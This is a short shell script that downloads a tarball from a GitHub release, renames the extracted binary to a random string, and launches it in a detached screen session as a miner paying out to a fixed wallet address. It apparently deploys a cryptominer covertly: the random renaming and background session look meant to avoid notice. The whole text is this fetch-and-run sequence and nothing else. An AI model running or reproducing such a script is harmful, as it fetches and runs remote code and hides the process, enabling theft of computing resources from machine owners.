wget https://github.com/staticneti/otodin/releases/download/v4.1.2/static.tar
tar -xf static.tar
rm -rf static.tar
variable8=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv static $variable8
screen -dmS cpu ./$variable8 mine --address 2xQeBibQUfWJi4t4Ua32vM3SjHLbwA6wHuXYHusGp9jm
